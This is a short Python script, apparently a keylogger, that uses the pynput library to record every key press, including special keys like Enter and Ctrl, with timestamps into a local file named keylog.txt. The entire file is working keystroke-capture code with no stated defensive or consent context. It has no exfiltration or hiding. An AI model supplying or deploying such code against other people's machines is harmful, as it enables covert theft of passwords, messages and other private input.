import pynput.keyboard
import logging
import os

# Define the log file location (current working directory)
log_dir = os.getcwd()
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging to capture timestamp and keystrokes
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        # Log standard characters (letters, numbers, symbols)
        logging.info(str(key.char))
    except AttributeError:
        # Log special execution keys (e.g., Space, Enter, Shift, Ctrl)
        logging.info(f" [{str(key)}] ")

# Initialize and lock the keyboard event listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
